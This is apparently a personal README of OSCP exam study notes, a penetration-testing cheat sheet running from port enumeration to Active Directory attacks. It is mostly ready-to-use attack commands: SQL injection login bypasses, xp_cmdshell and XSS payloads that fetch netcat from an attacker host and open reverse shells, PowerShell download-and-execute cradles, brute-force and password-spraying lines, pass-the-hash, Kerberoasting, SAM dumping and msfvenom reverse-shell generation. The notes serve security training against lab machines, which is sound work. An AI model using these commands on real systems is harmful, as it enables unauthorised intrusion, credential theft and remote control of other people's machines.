# oscp-notes

I Passed the OSCP in January 2021. These are the notes I took along my journey to achieving it. 

## Table of Contents
- [Enumeration](#Enumeration)
- [Web Exploitation](#Web-Exploitation)
- [Post Exploitation Linux](#Post-Exploitation-Linux)
- [Post Exploitation Windows](#Post-Exploitation-Windows)
- [Active Directory](#Active-Directory)
- [Pivoting & Port Forwarding](#Pivoting--Port-Forwarding)
- [Other](#Other)
- [Buffer Overflow](#Buffer-Overflow)

Enumeration
===============================================================================================
`Basics`


-    Standard Port Scan  
     `sudo nmap -T4 -p- -A --osscan-guess --version-all -o in.scan -Pn`

-    Udp Port Scan  
        `sudo nmap --top-ports 100 -sU -o udp.scan -Pn`

-    Extensions  
    `txt,php,aspx,cgi,asp,html,jsp,pdf,doc,docx,xls,xlsx,rtf,bak,xml,xsl,phpthml,sh,pl,py,config,php7,exe`

-    Wordlists  

         /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
         /usr/share/seclists/Discovery/Web-Content/common.txt
         /usr/share/seclists/Discovery/Web-Content/big.txt
         /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
         /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
         /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
         /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
         
`TCP 21: FTP`
 
 -   Download Everything  
     `wget -m ftp://anonymous:anonymous@<ip>`
   
-    Ftp Nmap Scan  
     `nmap --script ftp-anon,ftp-bounce,ftp-brute,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum,ftp-syst -p21 <RHOST>`

-    Ssl Ftp Connection  
     `openssl s_client -connect <RHOST>:21 -starttls ftp`<br><br>

`TCP 22: SSH`

-    Bruteforce  
     `hydra -l root -P /usr/share/wordlists/password/10k <RHOST> -t 4 ssh`<br><br>
     
`TCP 25: SMTP`

-    Nmap Enumeration  
     `sudo nmap --script "smtp-commands,smtp-open-relay,smtp-vuln*" -p25 <RHOST>`
     
-    User Enumeration  
     `sudo nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY} -p25 <RHOST>`
 
-    Version Scan  
     `auxiliary/scanner/smtp/smtp_enum`

-    Introduction  
     `HELO <LHOST> || EHLO <LHOST>`
   
-    Enumerate Users  
     `EXPN <user> || VRFY <user>`

-    Send Mail From  
     `MAIL FROM:test@test.org`
     
-    Send Mail To  
     `RCPT TO:<user>`<br><br>

`TCP 53: DNS`

-    Standard Enum  

         nslookup  
         server <RHOST>  
         127.0.0.1  
         <RHOST>  
      
-    Zone Transfer  
     `dig axfr @<RHOST> <dnsname>`

-    Dns Recon  
         
         dnsrecon -r 127.0.0.0/24 -n <rhost>
         dnsrecon -d <RHOST> -r 10.0.0.0/8
     
<br>
     
`TCP 79: Finger Enumeration`

-    [Pentest Monkey Link](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum)

<br>

`tcp 88: Kerberos`

-    Use [Kerbrute](https://github.com/ropnop/kerbrute) to Enumerate Users and Passwords  
     
-    [Rubeus](https://github.com/GhostPack/Rubeus)  

<br> 

`TCP 110: POP3`

-    Nmap Enum Script  
     `sudo nmap --script pop3-capabilities,pop3-ntlm-info -p110 <RHOST>`

-    Bruteforce  
     `sudo nmap --script pop3-brute -p110 <RHOST>`
     `auxiliary/scanner/pop3/pop3_login`
     
-    Login  
     
         USER <username>
         PASS <password>
         list                 - List Emails
         retr <email_num>     - Retrieve Email 
<br>

`TCP 111: RPCBIND`

-    Enumeration  
     `rpcinfo -p <RHOST>`  
     `rpcinfo -s <RHOST>`  
<br>

`TCP 119: NNTP`

-    Possible commands  
     `HELP, LIST`
<br><br>

`TCP 135 MSRPC`

-    Nmap Scan  
     `sudo nmap -n -sV -Pn -p 135 --script=msrpc-enum <RHOST>`
     
-    MSF Enum  

         use auxiliary/scanner/dcerpc/endpoint_mapper
         use auxiliary/scanner/dcerpc/hidden
         use auxiliary/scanner/dcerpc/management
         use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor  
         
-    RPC Dump  
     `/usr/bin/impacket-rpcdump <RHOST> -p 135`<br><br>
     
 `TCP 139/445: SMB/RPC`

-    smbmap  
     `smbmap -H <RHOST>`
     
-    [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)  
     `/opt/enum4linux-ng/enum4linux-ng.py -A <rhost>`  
   
-    Version Scan  
     `use auxiliary/scanner/smb/smb_version`
     
-    light nmap  
     `sudo nmap -p445 --script safe 10.10.10.100`       
     
-    Enumerate Share Permissions  
     `crackmapexec smb <RHOST> --shares`
  
-    Log Into Shares  
     `smbclient //<RHOST>/<Share> -U <user>`
     
-    Dump Info  
     `python3 /usr/share/doc/python3-impacket/examples/samrdump.py <RHOST>`

-    Dump Info  
     `rpcclient -U "" <RHOST>`<br><br>
     
`TCP 143:`

-    Login  
     `A001 login <user> <password>`
     
-    Use Evolution Mail Client to Log In 

<br>

`TCP 389: LDAP`

-    ldapsearch  
     `ldapsearch -h <rhost> -x`  
     `ldapsearch -h <rhost> -x -s base namingcontexts`  
     `ldapsearch -h <rhost> -x -b "<information from previous command>"`  
     `ldapsearch -h <rhost> -x -b "<information from previous command>" '(objectClass=Person)'`  
     
<br>

`TCP 443`

-    Manually Check Certificate  

-    Add DNS Names to /etc/hosts  

-    SSL Enum    
     `nmap -sV --script ssl-enum-ciphers <RHOST>`
     
-    Nikto  
     `nikto -h <RHOST> -p 443 -output nikto_443`

-    SSLScan  
     `sslscan <ip>`<br><br>
     
`TCP 1433: MSSQL`

-    Nmap Scan  
     `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER <RHOST>`
     
-    Log In  
     `sqsh -S <RHOST> -U <user>`
 
-    Another Login  
     `use auxiliary/scanner/mssql/mssql_login`<br><br>
     
`TCP 1521: ORACLE`
     
-    [Good Blog Post](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573)  

-    [Oracle Database Attacking Tool](https://github.com/quentinhardy/odat)  
<br>

`TCP 2049: NFS`   

-    Show Mountable Files
     `showmount -a(d)(e) <RHOST>`<br><br>
   
`TCP 3306: MYSQL`
     
-    Login  
     `mysql -u <user> -p`
    
-    Extensive Nmap  
     `nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <RHOST>`
     
-    MSF Scripts  
     
         use auxiliary/scanner/mysql/mysql_version
         use auxiliary/scanner/mysql/mysql_authbypass_hashdump
         auxiliary/scanner/mysql/mysql_hashdump
         mysql_enum
         mysql_schemadump
         mysql_start_up
         
<br>

`TCP 3389: RDP`

-    Log In  
     `rdesktop -u <user> -p <password> <RHOST>`
<br>
     
`UDP 161: SNMP`

-    Enum  
     `snmpwalk -c public -v2c <RHOST>`
     `snmp-check <RHOST>`

<br>

`Active Directory`  

-    [rpcclient](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)

         rpcclient <rhost> (-U '')  
         enumdomusers  
         enumdomains  
         srvinfo  
         setuserinfo2 <user> 23 '<new_pass>'
          createdomuser username  
          setuserinfo2 username 24  
               <password>  
       
            
-    SMB  

-    Kerbrute  
     `./kerbrute userenum --dc <rhost> -d <domain> <users.txt>`  
                        
-    Npusers  (Dump hashes for users)  
     'GetNPUsers.py -dc-ip <rhost> -no-pass -usersfile <users.txt> <domain>/`  
     
-    [Bloodhound.py](https://github.com/fox-it/BloodHound.py)  

         edit /etc/resolve.conf
          nameserver <rhost>
          search <domain>
         python3 bloodhound.py -u <user> -p <password> -ns <rhost> -d domain -c all
         Run Bloodhound
          
 -   ldap

<br><br>

Web Exploitation
===============================================================================================
`SQL Injection`

-    SQLMap  
     `sqlmap -r <burp_file>`
     
-    Test for SQLI  
         
         '
         '-- -
         ASCII(97)
         ' or 1=1--
         '; waitfor delay ('0:0:20)'--
         wfuzz -u http://<RHOST>/FUZZ -w /usr/share/seclists/Fuzzing/special-chars.txt
     
-    Login Bypass  

         admin' --
         admin' -- -
         admin'-
         admin' #
         admin'/*
         admin' or 1=1--
         admin' or 1=1#
         admin' or 1=1/*
         admin') or '1'='1--
         admin') or ('1'='1--
    
-    Abuse Command Shell  

         ' EXEC sp_configure 'xp_cmdshell', 1--
         ' reconfigure--
         ' EXEC xp_cmdshell 'certutil -urlcache -f http://<LHOST>:<LPORT>/nc.exe nc.exe'--
         ' EXEC xp_cmdshell "nc.exe -e cmd.exe <LHOST> <LPORT>";--
       
<br>         
`LFI/RFI`

-    Linux Path  
     `../../../../../../../../etc/passwd`
 
-    [Windows LFI](https://github.com/seal9055/Docs/blob/main/windows_lfi)   
     `c:\windows\system32\drivers\etc\hosts`
         
-    RFI  
     `http://<LHOST:80>/p0wny_shell.php`
     
-    Wordlists  

         /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
         /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
<br>
         
`CGI-BIN`

-    Popular Extensions: .sh & .pl  

-    Nmap Check  
     `nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/<vulnerable file>,cmd=ls <RHOST>`
     
-    MSF Check  
     `auxiliary/scanner/http/apache_mod_cgi_bash_env`
     
-    MSF Exploit  
     `exploit/multi/http/apache_mod_cgi_bash_env_exec`
     
<br>

`XSS`

-    Test  
     `test: <img src=http://<lhost>/<lport>)>`
     
-    Reverse Shell
     `<img src=http://<lhost>/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'<LHOST>'$IFS'<LHOST>')>`
     
-    [SSTI - Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

![SSTI](https://github.com/seal9055/Docs/blob/main/SSTI.png?raw=true)

<br>

`CMS`

-    WORDPRESS  
     `wpscan --url http://<RHOST> (--api-token <token>) -e u,ap,at --plugins-detection aggressive`
     
-    MAGENTO  
     [Magescan](https://github.com/steverobbins/magescan)
<br>

`Bruteforce`

-    hydra  
     `hydra -l admin -P /usr/share/wordlists/password/10k <RHOST> http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed' -V -t 64`
     
<br>

Post Exploitation Linux
===============================================================================================

<br>

`File Upload`

-    Starting Web Server  
     `python3 -m http.server 80`
     
-    Filetransfer  

         wget <LHOST>/<file>
         curl http://<LHOST>/<file> -o <output-file>
         echo "GET /<file> HTTP/1.0" | nc -n <LHOST> 80 > <out-file> && sed -i '1,7d' <out-file>
    
-    Secure Filetransfers  

         on target:  ncat -nvlp <port> --ssl > <out-file>
         on kali:  ncat -nv <RHOST> <RPORT> --ssl < <file-to-send>
<br>

`Enum Tools`

[Linenum](https://github.com/rebootuser/LinEnum)  
[linux smart enumeration](https://github.com/diego-treitos/linux-smart-enumeration)  
[linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)  
[pspy](https://github.com/DominicBreuker/pspy)  
[suid3num](https://github.com/Anon-Exploiter/SUID3NUM)  

<br>

`Upgrade Shell`  
-    `python -c 'import pty;pty.spawn("/bin/bash")'`  
-    `cltr-z `  
-    `stty raw -echo;fg  fg`  
-    `export TERM=xterm`  
-    `stty -a ; stty rows columns 136 rows 32`  
-    `export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`  

<br>

`Manual`

-    `whoami/id/hostname`  

-    `cat /etc/issue`  
-    `cat /etc/*-release`  

-    `history`  

-    `w`  

-    `ls -l /etc/passwd`  
-    `ls -l /etc/shadow`  
-    `ls -l /etc/group`  

         sudo -l    
         (check for env_keep+=LD_PRELOAD)  
         (check for env_keep+=LD_LIBRARY_PATH)  
         (sudo Version under 1.9, 1.8.27 exploitable)  

-    `find / -group <mygroup> -ls 2>/dev/null`  
-    `find / -user <myuser> -ls 2>/dev/null`  

-    `cat /etc/exports - (check for nsf)`

-    `mount -l`  
-    `cat /etc/fstab`  
-    `/bin/lsblk`  

-    `lpstat -a`  
-    `lscpu`  

<br>

`Common Files`

-    `grep -Rli password`  
-    `/`  
-    `/home`    
-    `/opt`  
-    `/tmp`  
-    `/var`  

<br>

`Cron`

-    `/etc/cronjobs`  

<br>

`Service Exploits`

-    `ps aux | grep "^root"`  
-    `netstat -antup`  

-    `<service> -v`  
-    `<service> --version`  

-    Debian  
     `dpkg -l | grep <service>`  
     
-    Rpm  
     `rpm -qa | grep <service>`  
     
<br>

`SUID & SGID`

`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`  

-    [gtfobins](https://gtfobins.github.io)  

-    Check For Writeable Shared Files ([Shell](https://github.com/seal9055/Docs/blob/main/suid.c))  

         strace <service> 2>&1 | grep -iE "open|access|no such file"
         create & compile the above linked shell
         Execute Service
         
-    Incomplete Path  
         
          strings <service>  
         strace -v -f -e execve <service> 2>&1    
         If found, create a binary with a reverse shell in the /tmp directory and add it to path  
         PATH=.:$PATH /service  
     
<br>

`Kernel Exploits`

-    `uname -a `  

-    `searchsploit linux kernel <version> <distribution> priv esc`  

-    `linux exploit suggester`  

<br>

`Network`

-    `ip a/ipconfig/ifconfig`  
-    `route`  
-    `ss -anp/netstat -anp`  
-    `dnsdomainname`  
-    `ls /etc | grep iptables`  
-    `cat /etc/networks` 
-    `netstat -punta`  

<br>

Post Exploitation Windows
===============================================================================================

<br>

`File Upload`

-    Starting Webserver  
     `python3 -m http.server <LPORT>`  
     
-    Certutil  
     `certutil -urlcache -f "http://<LHOST>:<LPORT>/<file>" <output-file>`  
     
-    SMB  
     `on kali: sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`  
     `on target: copy \\<myip>\reverse.exe C:\tmp\reverse.exe`  
     
-    Powershell  
     `cmd /c powershell IEX(new-object net.webclient).downloadstring('http://<LHOST>/Invoke-PowerShellTcp.ps1')`  
     `powershell.exe IEX(new-object net.webclient).downloadstring('http://<LHOST>/Invoke-PowerShellTcp.ps1')`  
     `powershell -c IEX(new-object net.webclient).downloadstring('http://<LHOST>/Invoke-PowerShellTcp.ps1')`  
     
-    Curl  
     `curl http://<LHOST>/<file> -o <file>`  
     
<br>

`Enum Tools`  

-    [Powerup](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)
     `powershell -ep bypass; .\powerup.ps1; Invoke-AllChecks`  
     
-    [Sherlock](https://github.com/rasta-mouse/Sherlock)  
     `powershell -ep bypass; Import-Module .\sherlock.ps1; Find-AllVulns`  
     
-    [Winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

<br>

`Manual`

         whoami /priv | /groups | /all  
         systeminfo  
         hostname  
         net users | net user <user>  
         set  
         tasklist /SCV  |  tasclist /v   

<br>

`Kernel Exploits`  

-    [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)  
-    [Secwiki](https://github.com/SecWiki/windows-kernel-exploits)  
-    [Sherlock](https://github.com/rasta-mouse/Sherlock)  

<br>

`Service Exploits`  

 -   Insecure Service Properties  

         SERVICE_START & SERVICE_STOP & SERVICE_CHANGE_CONFIG  
         sc qc <service>
         sc query <service>
         sc config <service> binpath= "\"C:\<reverse_shell>\""
         listener on kali + START/STOP SERVICE
         
-    Unquoted Service Path  
     
         SERVICE_START & SERVICE_STOP + unquoted service path
         
-    Weak Registry Permissions  

         reg query <full path to service>  
         
-    Insecure Service Executables  

         check winpeas for writeable service executable  
         replace file with reverse shell
         
-    DLL Hijacking  

         Check all services winpeas recognizes 1 by 1
         sc qc <service>

<br>

`Scheduled Tasks`  

-    `dir C:\windows\tasks`  
-    `schtasks /query /fo LIST /v`  

<br>

`Network`  

         ipconfig | ifconfig
         route print
         arp -a
         netstat -ano
         C:\WINDOWS\System32\drivers\etc\hosts

<br>

`Registry`  

-    Autorun  
     `Overwrite program with reverse shell and restart`  
     
-    Always Install Elevated  
     `Check Winpeas for always install elevated`  

<br>

`Common Files`

         %SYSTEMROOT%\repair\SAM
         %SYSTEMROOT%\System32\config\RegBack\SAM
         %SYSTEMROOT%\System32\config\SAM
         %SYSTEMROOT%\repair\system
         %SYSTEMROOT%\System32\config\SYSTEM
         %SYSTEMROOT%\System32\config\RegBack\system
         
<br>

`Passwords`

-    Use chisel to remotely forward port 445, and use winexe to log in  
     `winexe -U <user>%<password> //<RHOST> cmd.exe`  
     
-    Check for passwords  
     `reg query HKLM /f password /t REG_SZ /s`  
     `reg query HKCU /f password /t REG_SZ /s`  
     
-    Weak Permissions on Sam Files  
     `python2 pwdump.py <SYSTEMFILE> <SAMFILE>`  

-    Cracking the password  
     `hashcat -m 1000 --force <hash> <wordlist>`
     
-    PTH  
     `pth-winexe -U '<entire-hash>' //<RHOST> cmd.exe` 

<br>

Active Directory
===============================================================================================

<br>

`Manual`

         ipconfig /all  
         route print  
         arp -a  
         netstat -ano  
         C:\WINDOWS\System32\drivers\etc\hosts  
         netsh firewall show state  
         netsh firewall show config  
         netsh dump  
         net user  
         net user /domain  
         net group /domain  
    
<br>

`Powerview`

         powershell -ep bypass  
         . .\powerview.ps1  
         net accounts  
         Get-NetDomain  
         Get-NetDomainController  
         Get-DomainPolicy  
         Get-NetUser  
         Get-NetUser | select cn  
         Get-NetUser | select samaccountname  
         Get-NetComputer  
         Get-NetGroup  
         Get-NetGroupMember  
         Get-DomainUser -SPN  
         Get-NetLoggedon -ComputerName <pc-name>  
         Get-NetSession -ComputerName <pc-name>  
         Invoke-ShareFinder  
         Get-NETGPO  
         Invoke-Kerberoast  
         
<br>
 
`Bloodhound`

         powershell -ep bypass  
         . .\sharphound.ps1  
         Invoke-BloodHound -CollectionMethod All -Domain <domain> -ZipFileName file.zip  
         Download zip onto kali, import into bloodhound  
         
<br>

`Cracking Ad Hashes`

         ntlm:   hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt`  
         ntlmv2: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`  
<br>

`PASS THE PW & HASH`

         crackmapexec <ip>/24 -u <user> -d <DOMAIN> -p <password>    
         crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local  

`Token Impersonation`
     
         meterpreter load icognito  
         list_tokens  
         impersonate_token <token>  
         
<br>

`Kerberoasting`

         Invoke-Kerberoast in powerview  
         Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\temp\hashcapture.txt' -width 8000  
         
<br>

`Password Spraying`

 -   Create Password List  
     `crunchy <length> <length> -t <pw-core>%%%% `
   
-    Spray  
     `rowbar -b rdp -s <ip>\32 -U users.txt -C pw.txt -n 1`
     
<br>

Pivoting & Port Forwarding
===============================================================================================

<br>

-    [Chisel](https://github.com/jpillora/chisel/releases (download windows & linux version))

         On Host: sudo ./chisel.sh server --reverse --port <LPORT>
         On Target: chisel client <LHOST>:<LPORT> R:<PORT_TO_FWD>:127.0.0.1:<PORT_TO_FWD>
    
<br>

Other
===============================================================================================

`Hashcracking`

-    John  
     `john --format=<fomrat> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`  

-    Hashcat

         hashcat -m <hashid> -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt -O  
         hashcat -m <hashid> -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt -O -r /usr/share/hashcat/rules/best64.rule  
         cat pw | hashcat -r/usr/share/hashcat/rules/best64.rule --stdout > wordlist.txt
         
<br>

`SSH Encrypted`  
-    `/usr/share/john/ssh2john`  

<br>

`Crack Zip Pw`  
-    `fcrackzip -uvDp /usr/share/wordlists/rockyou.txt file.zip`  

<br>

`Tcp Dump`
-    `sudo tcpdump -i tun0 icmp`  

<br>

`Images`  
-    `binwalk <image>`  
-    `binwalk -Me <image>`  
     
<br>

`Recognize Encryption` 
-    [Tio.run](https://tio.run/#)  

<br>

`Pip fix (Rarely works)`  
         
         curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py   
         python get-pip.py  
         python -m pip install requests    

<br>

`MYSQL`
         
         show databases;
         use <database>
         show tables;
         select * from <table>;
      
<br>   

Buffer Overflow
===============================================================================================

<br>

-    [Tib3rius](https://tryhackme.com/room/bufferoverflowprep)

         !mona config -set workingfolder c:\mona\%p
         /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crash_value + 400>
         !mona findmsp -distance <crash_value> + retn = BBBB
         !mona bytearray -b "\x00"
         python bad_chars.py
         !mona compare -f C:\mona\oscp\bytearray.bin -a <esp addr>
         !mona jmp -r esp -cpb "\x00"
         msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=4444 EXITFUNC=thread -b "\x00" -f py
         padding = "\x90" * 16
         
<br>
